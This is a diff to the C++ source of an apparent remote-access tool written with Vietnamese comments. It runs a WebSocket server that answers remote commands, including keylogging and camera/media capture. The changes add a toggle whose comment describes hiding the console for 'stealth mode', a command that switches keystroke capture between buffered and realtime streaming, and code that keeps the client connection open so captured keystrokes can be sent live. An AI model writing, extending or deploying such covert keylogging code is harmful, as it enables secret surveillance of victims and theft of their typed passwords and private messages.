@@ -1,5 +1,15 @@
-﻿// Dòng này giấu cửa sổ Console đi ngay khi khởi động (Không hiện màn hình đen)
-#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+﻿// =================================================================================
+// ⚙️ CẤU HÌNH HIỂN THỊ CONSOLE
+// =================================================================================
+// ✅ SHOW_CONSOLE = true  → Hiện cửa sổ console (dùng khi debug/development)
+// ❌ SHOW_CONSOLE = false → Ẩn console (dùng khi deploy/stealth mode)
+#define SHOW_CONSOLE true
+// =================================================================================
+
+#if !SHOW_CONSOLE
+    // Dòng này giấu cửa sổ Console đi ngay khi khởi động (Không hiện màn hình đen)
+    #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+#endif
 
 #include "Global.h"
 #include "SystemManager.h"
@@ -120,6 +130,26 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                 g_KeylogBuffer = "";            // Xóa sau khi lấy để tránh trùng lặp
                 j_res["type"] = "KEYLOG_RESULT";
             }
+            else if (cmd == "SET_KEYLOG_MODE") {
+                if (j_req.contains("mode")) {
+                    std::string mode = j_req["mode"];
+                    if (mode == "buffer" || mode == "realtime") {
+                        std::lock_guard<std::mutex> lock(g_LogMutex);
+                        g_KeylogMode = mode;
+                        j_res["msg"] = "Keylog mode đã chuyển sang: " + mode;
+                        j_res["currentMode"] = g_KeylogMode;
+                    }
+                    else {
+                        j_res["msg"] = "Chế độ không hợp lệ. Chỉ chấp nhận: buffer hoặc realtime";
+                    }
+                }
+                else {
+                    // Nếu không có tham số, trả về chế độ hiện tại
+                    j_res["currentMode"] = g_KeylogMode;
+                    j_res["msg"] = "Chế độ hiện tại: " + g_KeylogMode;
+                }
+                j_res["type"] = "ACTION_RESULT";
+            }
 
             // =============================================================
             // 4. NHÓM LỆNH: MEDIA (HÌNH ẢNH & CAMERA)
@@ -199,11 +229,18 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
 // --- SỰ KIỆN KHI CÓ KẾT NỐI MỚI ---
 void on_open(server* s, websocketpp::connection_hdl hdl) {
     std::cout << ">>> Client CONNECTED (Ket noi thanh cong)" << std::endl;
+    
+    // Lưu thông tin connection để dùng cho real-time keylog
+    g_ClientHdl = hdl;
+    g_ClientConnected = true;
 }
 
 // --- SỰ KIỆN KHI NGẮT KẾT NỐI ---
 void on_close(server* s, websocketpp::connection_hdl hdl) {
     std::cout << "<<< Client DISCONNECTED (Ngat ket noi)" << std::endl;
+    
+    // Reset connection state
+    g_ClientConnected = false;
 }
 
 // =================================================================================
@@ -243,6 +280,7 @@ int main() {
 
     // 4. Khởi tạo Server WebSocket
     server echo_server;
+    g_ServerPtr = &echo_server; // Lưu con trỏ để dùng trong keylogger
 
     try {
         // Tắt bớt log rác để màn hình console sạch sẽ
